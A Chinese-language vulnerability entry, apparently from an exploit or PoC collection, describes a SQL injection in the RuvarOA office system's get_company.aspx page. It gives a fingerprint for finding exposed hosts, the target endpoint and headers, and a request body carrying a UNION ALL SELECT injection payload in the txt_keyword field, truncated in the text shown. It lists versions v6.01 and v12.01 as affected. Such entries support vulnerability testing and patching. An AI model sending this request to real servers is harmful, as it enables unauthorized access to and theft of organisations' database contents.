# RuvarOAget_company存在SQL注入漏洞

- **系统**：RuvarOAget　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`POST /ContractManage/get_company.aspx HTTP/1.1`
- **关键头**：`Content-Length: 527`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=/wEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkkF7Fra0mv6NIEvEWzCtrd3VHKNxuM7stEqn5DF0zdWg=&ddl_type=&ddl_field=dw_bh&txt_keyword=11%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2883%29%2BCHAR%2871%29%2BCHAR%2878%29%2BCHAR%28117%29%2BCHAR%28106%29%2BCHAR%2870%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%28122%29%2…（脚本共 1921 字，完整版见原文）
```

**其他**
- RuvarOA get\_company存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01